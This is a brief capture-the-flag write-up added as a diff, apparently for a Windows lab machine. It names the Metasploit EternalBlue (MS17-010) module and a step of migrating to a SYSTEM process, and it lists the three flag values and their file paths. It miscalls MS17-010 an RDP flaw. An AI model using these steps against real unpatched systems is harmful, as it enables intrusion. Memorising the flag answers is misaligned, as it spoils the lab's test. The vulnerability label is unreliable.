@@ -1,0 +1,25 @@
+--Nmap--
+```
+vulnerable with ms17-010 --> RDP Execution vulnerability
+```
+
+--Metasploit--
+```
+exploit: exploit/windows/smb/ms17_010_eternalblue
+(Note: Eternal blue exploit as of this writing automatically escalates privillage and lands already with meterpreter.)
+>> migrate to NT AUTHORITY\SYSTEM owned process (preferably winlog.exe)
+```
+
+--Flags and their Locations --
+```
+Flag 1: access_the_machine
+Located at: C:\
+
+Flag 2: sam_database_elevated_access
+Located at: C:\Windows\System32\config
+
+Flag 3: admin_documents_can_be_valuable
+Located at: C:\Users\Jon\Documents
+
+(Note: The flags can be easily located using meterpreter with the search command, specifically using "search -f flag*.txt" while located at C:\)
+```
